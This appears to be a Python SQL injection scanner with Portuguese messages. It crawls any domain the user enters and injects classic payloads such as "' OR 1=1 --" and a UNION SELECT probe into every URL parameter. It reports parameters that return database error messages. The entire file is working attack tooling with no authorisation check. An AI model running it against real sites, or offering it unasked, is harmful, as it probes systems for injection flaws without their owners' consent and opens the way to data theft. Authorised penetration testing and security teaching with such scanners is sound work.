import requests
import urllib.parse
from bs4 import BeautifulSoup
import json
from tqdm import tqdm

SQL_PAYLOADS = [
    "' OR '1'='1", "' OR 1=1 --", "' OR 'a'='a", "admin' --", "' UNION SELECT NULL, NULL --"
]

def verifica_sql_error(response_text):
    erros_sql = [
        "SQL syntax", "mysql_fetch", "ODBC SQL", "SQLSTATE", "Microsoft OLE DB Provider for SQL Server",
        "Warning: mysql_", "You have an error in your SQL syntax"
    ]
    return any(erro in response_text for erro in erros_sql)


def get_links(url, domain):
    links_encontrados = set()
    
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, "html.parser")

        for link in soup.find_all("a", href=True):
            full_url = urllib.parse.urljoin(domain, link["href"])
            if domain in full_url:
                links_encontrados.add(full_url)
    except requests.exceptions.RequestException:
        pass
    
    return links_encontrados

def test_sql_injection(url, payloads, vulnerabilidades):
    parsed_url = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed_url.query)

    if not params:
        return False 

    print(f"\n🔍 Testando SQL Injection em {url}")

    for param in params:
        for payload in tqdm(payloads, desc=f"Testando {param}", unit="payload", ncols=100):
            test_params = params.copy()
            test_params[param] = payload
            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?" + urllib.parse.urlencode(test_params, doseq=True)

            try:
                response = requests.get(test_url)

                if verifica_sql_error(response.text):
                    vulnerabilidades.append({"url": test_url, "parametro": param, "payload": payload})
                    print(f"🚨 [VULNERÁVEL] {test_url} | Param: {param} | Payload: {payload}")
            except requests.exceptions.RequestException:
                pass

    return bool(vulnerabilidades)

def crawl_sql(domain, payloads):
    visited = set()
    queue = [domain]
    vulnerabilidades = []

    while queue:
        url = queue.pop(0)
        if url in visited:
            continue

        print(f"\n🔎 Rastejando: {url}")
        visited.add(url)

        test_sql_injection(url, payloads, vulnerabilidades)

        links = get_links(url, domain)
        queue.extend(links - visited)

    return vulnerabilidades

if __name__ == "__main__":
    target_domain = input("🌐 Digite o domínio para varredura (ex: http://testphp.vulnweb.com): ")
    
    vulnerabilidades = crawl_sql(target_domain, SQL_PAYLOADS)
    
    if vulnerabilidades:
        print("\n🚨 SQL INJECTION DETECTADO NAS SEGUINTES URLS:")
        for vuln in vulnerabilidades:
            print(f"🔗 {vuln['url']} | Param: {vuln['parametro']} | Payload: {vuln['payload']}")

        salvar_json = input("\n💾 Deseja salvar os resultados em JSON? (s/n): ").strip().lower()
        if salvar_json == "s":
            with open("resultados_sql.json", "w", encoding="utf-8") as f:
                json.dump(vulnerabilidades, f, indent=4)
            print("✅ Resultados salvos em 'resultados_sql.json'")
    else:
        print("\n✅ Nenhuma vulnerabilidade SQL Injection encontrada.")

    print("\n✅ Varredura concluída!")
